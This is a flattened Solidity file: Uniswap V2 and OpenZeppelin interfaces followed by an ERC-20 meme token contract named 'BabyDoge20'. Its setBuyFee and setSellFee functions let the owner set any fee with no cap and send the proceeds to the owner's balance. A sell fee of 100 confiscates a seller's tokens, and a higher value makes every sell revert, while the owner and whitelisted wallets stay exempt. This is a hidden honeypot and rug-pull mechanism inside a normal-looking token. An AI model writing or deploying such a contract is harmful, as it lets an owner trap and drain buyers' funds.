1 // SPDX-License-Identifier: MIT
2 // File: @uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol
3 
4 pragma solidity >=0.5.0;
5 
6 interface IUniswapV2Factory {
7     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
8 
9     function feeTo() external view returns (address);
10     function feeToSetter() external view returns (address);
11 
12     function getPair(address tokenA, address tokenB) external view returns (address pair);
13     function allPairs(uint) external view returns (address pair);
14     function allPairsLength() external view returns (uint);
15 
16     function createPair(address tokenA, address tokenB) external returns (address pair);
17 
18     function setFeeTo(address) external;
19     function setFeeToSetter(address) external;
20 }
21 
22 // File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol
23 
24 pragma solidity >=0.6.2;
25 
26 interface IUniswapV2Router01 {
27     function factory() external pure returns (address);
28     function WETH() external pure returns (address);
29 
30     function addLiquidity(
31         address tokenA,
32         address tokenB,
33         uint amountADesired,
34         uint amountBDesired,
35         uint amountAMin,
36         uint amountBMin,
37         address to,
38         uint deadline
39     ) external returns (uint amountA, uint amountB, uint liquidity);
40     function addLiquidityETH(
41         address token,
42         uint amountTokenDesired,
43         uint amountTokenMin,
44         uint amountETHMin,
45         address to,
46         uint deadline
47     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
48     function removeLiquidity(
49         address tokenA,
50         address tokenB,
51         uint liquidity,
52         uint amountAMin,
53         uint amountBMin,
54         address to,
55         uint deadline
56     ) external returns (uint amountA, uint amountB);
57     function removeLiquidityETH(
58         address token,
59         uint liquidity,
60         uint amountTokenMin,
61         uint amountETHMin,
62         address to,
63         uint deadline
64     ) external returns (uint amountToken, uint amountETH);
65     function removeLiquidityWithPermit(
66         address tokenA,
67         address tokenB,
68         uint liquidity,
69         uint amountAMin,
70         uint amountBMin,
71         address to,
72         uint deadline,
73         bool approveMax, uint8 v, bytes32 r, bytes32 s
74     ) external returns (uint amountA, uint amountB);
75     function removeLiquidityETHWithPermit(
76         address token,
77         uint liquidity,
78         uint amountTokenMin,
79         uint amountETHMin,
80         address to,
81         uint deadline,
82         bool approveMax, uint8 v, bytes32 r, bytes32 s
83     ) external returns (uint amountToken, uint amountETH);
84     function swapExactTokensForTokens(
85         uint amountIn,
86         uint amountOutMin,
87         address[] calldata path,
88         address to,
89         uint deadline
90     ) external returns (uint[] memory amounts);
91     function swapTokensForExactTokens(
92         uint amountOut,
93         uint amountInMax,
94         address[] calldata path,
95         address to,
96         uint deadline
97     ) external returns (uint[] memory amounts);
98     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
99         external
100         payable
101         returns (uint[] memory amounts);
102     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
103         external
104         returns (uint[] memory amounts);
105     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
106         external
107         returns (uint[] memory amounts);
108     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
109         external
110         payable
111         returns (uint[] memory amounts);
112 
113     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
114     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
115     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
116     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
117     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
118 }
119 
120 // File: @uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol
121 
122 pragma solidity >=0.6.2;
123 
124 
125 interface IUniswapV2Router02 is IUniswapV2Router01 {
126     function removeLiquidityETHSupportingFeeOnTransferTokens(
127         address token,
128         uint liquidity,
129         uint amountTokenMin,
130         uint amountETHMin,
131         address to,
132         uint deadline
133     ) external returns (uint amountETH);
134     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
135         address token,
136         uint liquidity,
137         uint amountTokenMin,
138         uint amountETHMin,
139         address to,
140         uint deadline,
141         bool approveMax, uint8 v, bytes32 r, bytes32 s
142     ) external returns (uint amountETH);
143 
144     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
145         uint amountIn,
146         uint amountOutMin,
147         address[] calldata path,
148         address to,
149         uint deadline
150     ) external;
151     function swapExactETHForTokensSupportingFeeOnTransferTokens(
152         uint amountOutMin,
153         address[] calldata path,
154         address to,
155         uint deadline
156     ) external payable;
157     function swapExactTokensForETHSupportingFeeOnTransferTokens(
158         uint amountIn,
159         uint amountOutMin,
160         address[] calldata path,
161         address to,
162         uint deadline
163     ) external;
164 }
165 
166 // File: @openzeppelin/contracts/utils/Context.sol
167 
168 
169 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
170 
171 pragma solidity ^0.8.0;
172 
173 /**
174  * @dev Provides information about the current execution context, including the
175  * sender of the transaction and its data. While these are generally available
176  * via msg.sender and msg.data, they should not be accessed in such a direct
177  * manner, since when dealing with meta-transactions the account sending and
178  * paying for execution may not be the actual sender (as far as an application
179  * is concerned).
180  *
181  * This contract is only required for intermediate, library-like contracts.
182  */
183 abstract contract Context {
184     function _msgSender() internal view virtual returns (address) {
185         return msg.sender;
186     }
187 
188     function _msgData() internal view virtual returns (bytes calldata) {
189         return msg.data;
190     }
191 }
192 
193 // File: @openzeppelin/contracts/access/Ownable.sol
194 
195 
196 // OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)
197 
198 pragma solidity ^0.8.0;
199 
200 
201 /**
202  * @dev Contract module which provides a basic access control mechanism, where
203  * there is an account (an owner) that can be granted exclusive access to
204  * specific functions.
205  *
206  * By default, the owner account will be the one that deploys the contract. This
207  * can later be changed with {transferOwnership}.
208  *
209  * This module is used through inheritance. It will make available the modifier
210  * `onlyOwner`, which can be applied to your functions to restrict their use to
211  * the owner.
212  */
213 abstract contract Ownable is Context {
214     address private _owner;
215 
216     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
217 
218     /**
219      * @dev Initializes the contract setting the deployer as the initial owner.
220      */
221     constructor() {
222         _transferOwnership(_msgSender());
223     }
224 
225     /**
226      * @dev Throws if called by any account other than the owner.
227      */
228     modifier onlyOwner() {
229         _checkOwner();
230         _;
231     }
232 
233     /**
234      * @dev Returns the address of the current owner.
235      */
236     function owner() public view virtual returns (address) {
237         return _owner;
238     }
239 
240     /**
241      * @dev Throws if the sender is not the owner.
242      */
243     function _checkOwner() internal view virtual {
244         require(owner() == _msgSender(), "Ownable: caller is not the owner");
245     }
246 
247     /**
248      * @dev Leaves the contract without owner. It will not be possible to call
249      * `onlyOwner` functions anymore. Can only be called by the current owner.
250      *
251      * NOTE: Renouncing ownership will leave the contract without an owner,
252      * thereby removing any functionality that is only available to the owner.
253      */
254     function renounceOwnership() public virtual onlyOwner {
255         _transferOwnership(address(0));
256     }
257 
258     /**
259      * @dev Transfers ownership of the contract to a new account (`newOwner`).
260      * Can only be called by the current owner.
261      */
262     function transferOwnership(address newOwner) public virtual onlyOwner {
263         require(newOwner != address(0), "Ownable: new owner is the zero address");
264         _transferOwnership(newOwner);
265     }
266 
267     /**
268      * @dev Transfers ownership of the contract to a new account (`newOwner`).
269      * Internal function without access restriction.
270      */
271     function _transferOwnership(address newOwner) internal virtual {
272         address oldOwner = _owner;
273         _owner = newOwner;
274         emit OwnershipTransferred(oldOwner, newOwner);
275     }
276 }
277 
278 // File: @openzeppelin/contracts/token/ERC20/IERC20.sol
279 
280 
281 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)
282 
283 pragma solidity ^0.8.0;
284 
285 /**
286  * @dev Interface of the ERC20 standard as defined in the EIP.
287  */
288 interface IERC20 {
289     /**
290      * @dev Emitted when `value` tokens are moved from one account (`from`) to
291      * another (`to`).
292      *
293      * Note that `value` may be zero.
294      */
295     event Transfer(address indexed from, address indexed to, uint256 value);
296 
297     /**
298      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
299      * a call to {approve}. `value` is the new allowance.
300      */
301     event Approval(address indexed owner, address indexed spender, uint256 value);
302 
303     /**
304      * @dev Returns the amount of tokens in existence.
305      */
306     function totalSupply() external view returns (uint256);
307 
308     /**
309      * @dev Returns the amount of tokens owned by `account`.
310      */
311     function balanceOf(address account) external view returns (uint256);
312 
313     /**
314      * @dev Moves `amount` tokens from the caller's account to `to`.
315      *
316      * Returns a boolean value indicating whether the operation succeeded.
317      *
318      * Emits a {Transfer} event.
319      */
320     function transfer(address to, uint256 amount) external returns (bool);
321 
322     /**
323      * @dev Returns the remaining number of tokens that `spender` will be
324      * allowed to spend on behalf of `owner` through {transferFrom}. This is
325      * zero by default.
326      *
327      * This value changes when {approve} or {transferFrom} are called.
328      */
329     function allowance(address owner, address spender) external view returns (uint256);
330 
331     /**
332      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
333      *
334      * Returns a boolean value indicating whether the operation succeeded.
335      *
336      * IMPORTANT: Beware that changing an allowance with this method brings the risk
337      * that someone may use both the old and the new allowance by unfortunate
338      * transaction ordering. One possible solution to mitigate this race
339      * condition is to first reduce the spender's allowance to 0 and set the
340      * desired value afterwards:
341      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
342      *
343      * Emits an {Approval} event.
344      */
345     function approve(address spender, uint256 amount) external returns (bool);
346 
347     /**
348      * @dev Moves `amount` tokens from `from` to `to` using the
349      * allowance mechanism. `amount` is then deducted from the caller's
350      * allowance.
351      *
352      * Returns a boolean value indicating whether the operation succeeded.
353      *
354      * Emits a {Transfer} event.
355      */
356     function transferFrom(
357         address from,
358         address to,
359         uint256 amount
360     ) external returns (bool);
361 }
362 
363 // File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
364 
365 
366 // OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)
367 
368 pragma solidity ^0.8.0;
369 
370 
371 /**
372  * @dev Interface for the optional metadata functions from the ERC20 standard.
373  *
374  * _Available since v4.1._
375  */
376 interface IERC20Metadata is IERC20 {
377     /**
378      * @dev Returns the name of the token.
379      */
380     function name() external view returns (string memory);
381 
382     /**
383      * @dev Returns the symbol of the token.
384      */
385     function symbol() external view returns (string memory);
386 
387     /**
388      * @dev Returns the decimals places of the token.
389      */
390     function decimals() external view returns (uint8);
391 }
392 
393 // File: contracts/BabyDoge2.sol
394 
395 
396 pragma solidity 0.8.19;
397 
398 
399 
400 
401 
402 
403 
404 contract BabyDoge20 is Context, IERC20Metadata, Ownable {
405 
406     IUniswapV2Router02 private immutable uniswapRouter;
407     address private immutable uniswapPair;
408 
409     uint256 public buyFee;
410     uint256 public sellFee;
411     mapping(address => bool) public Addresslist;
412 
413     string private _name;
414     string private _symbol;
415     uint8 private _decimals = 18;
416     uint256 private _totalSupply;
417 
418     mapping(address => uint256) private _balances;
419     mapping(address => mapping(address => uint256)) private _allowances;
420 
421     constructor(
422         string memory _tokenName,
423         string memory _tokensymbol,
424         uint256 initialSupply,
425         address _uniswapRouter
426     ) {
427         _name = _tokenName;
428         _symbol = _tokensymbol;
429 
430         _totalSupply = initialSupply * 10**_decimals;
431         _balances[_msgSender()] = _totalSupply;
432 
433         uniswapRouter = IUniswapV2Router02(_uniswapRouter);
434         uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());
435 
436         buyFee = 0;
437         sellFee = 0;
438 
439         Addresslist[_msgSender()] = true;
440 
441         emit Transfer(address(0), _msgSender(), _totalSupply);
442     }
443 
444     event TokenChargedFees(address indexed sender, uint256 amount, uint256 timestamp);
445 
446     function name() external view returns (string memory) {
447         return _name;
448     }
449 
450     function symbol() external view returns (string memory) {
451         return _symbol;
452     }
453 
454     function decimals() external view returns (uint8) {
455         return _decimals;
456     }
457 
458     function totalSupply() external view override returns (uint256) {
459         return _totalSupply;
460     }
461 
462     function balanceOf(address account) external view override returns (uint256) {
463         return _balances[account];
464     }
465 
466     function transfer(address recipient, uint256 amount) public override returns (bool) {
467         _transfer(_msgSender(), recipient, amount);
468         return true;
469     }
470 
471     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
472         _transfer(sender, recipient, amount);
473         uint256 currentAllowance = _allowances[sender][_msgSender()];
474         require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
475         _approve(sender, _msgSender(), currentAllowance - amount);
476         return true;
477     }
478 
479     function allowance(address owner, address spender) external view override returns (uint256) {
480         return _allowances[owner][spender];
481     }
482 
483     function approve(address spender, uint256 amount)
484     external override returns (bool) {
485         _approve(_msgSender(), spender, amount);
486         return true;
487     }
488 
489     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
490         _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
491         return true;
492     }
493 
494     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
495         uint256 currentAllowance = _allowances[_msgSender()][spender];
496         require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
497         _approve(_msgSender(), spender, currentAllowance - subtractedValue);
498         return true;
499     }
500 
501     function _transfer(address sender, address recipient, uint256 amount) internal {
502         require(sender != address(0), "ERC20: transfer from the zero address");
503         require(recipient != address(0), "ERC20: transfer to the zero address");
504         require(amount > 0, "Transfer amount must be greater than zero");
505 
506         uint256 senderBalance = this.balanceOf(sender);
507         require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
508 
509         uint256 chargeAmount = 0;
510         uint256 transferAmount = amount;
511 
512         // Check the sender/recipient
513         if (!Addresslist[sender] && !Addresslist[recipient]) {
514             // Buy
515             if (sender == uniswapPair && buyFee > 0) {
516                 chargeAmount = amount * buyFee / 100;
517             // Sell
518             } else if (recipient == uniswapPair && sellFee > 0) {
519                 chargeAmount = amount * sellFee / 100;
520             }
521 
522             if (chargeAmount > 0) {
523                 transferAmount = transferAmount - chargeAmount;
524                 _balances[owner()] = _balances[owner()] + chargeAmount;
525                 emit TokenChargedFees(sender, chargeAmount, block.timestamp);
526             }
527         }
528 
529         _balances[sender] = senderBalance - amount;
530         _balances[recipient] = _balances[recipient] + transferAmount;
531 
532         emit Transfer(sender, recipient, transferAmount);
533     }
534 
535     function _approve(address owner, address spender, uint256 amount) internal virtual {
536         require(owner != address(0), "ERC20: approve from the zero address");
537         require(spender != address(0), "ERC20: approve to the zero address");
538 
539         _allowances[owner][spender] = amount;
540         emit Approval(owner, spender, amount);
541     }
542 
543     function setBuyFee(uint256 newBuyFee) external onlyOwner {        
544         buyFee = newBuyFee;
545     }
546 
547     function setSellFee(uint256 newSellFee) external onlyOwner {        
548         sellFee = newSellFee;
549     }
550 
551     function updateWalletList(address account, bool status) external onlyOwner {
552         Addresslist[account] = status;
553     }
554 }